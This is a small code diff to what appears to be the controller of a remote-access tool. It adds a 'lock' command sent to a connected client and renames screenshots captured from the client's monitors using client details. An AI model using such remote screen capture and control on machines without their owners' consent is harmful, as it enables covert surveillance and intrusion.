@@ -278,6 +278,9 @@ def send_commands():
         elif strChoice == '--p 1' or strChoice == 'primary_screenshoot':
             screenshot(all_monitors=False)
 
+        elif strChoice == '--x 1' or strChoice == 'lock':
+            send(b'lock')
+
 
         # TODO: Own Implementation
         # --h, See Commands List Help Menu
@@ -318,7 +321,7 @@ def screenshot(all_monitors=True):
     intBuffer = int(intBuffer)
 
     # Create filename from Date for screenshot
-    strFile = strftime("%Y%m%d%H%M%S" + ".png")
+    strFile = arrInfo[1] + '.' + arrInfo[3]  + '_' + strftime("%Y%m%d-%H%M%S" + ".png")
 
     # Receive Screenshot bytes from the Client
     screenData = recvall(intBuffer)
@@ -334,6 +337,7 @@ def screenshot(all_monitors=True):
 
     except Exception as e:
         print(fColors.LIGHT_RED + f"[-] Error while Saving Screenshot.\nError: {fColors.RESET}{e}")
+
 
 
 """ Note: All Function should write before this section"""
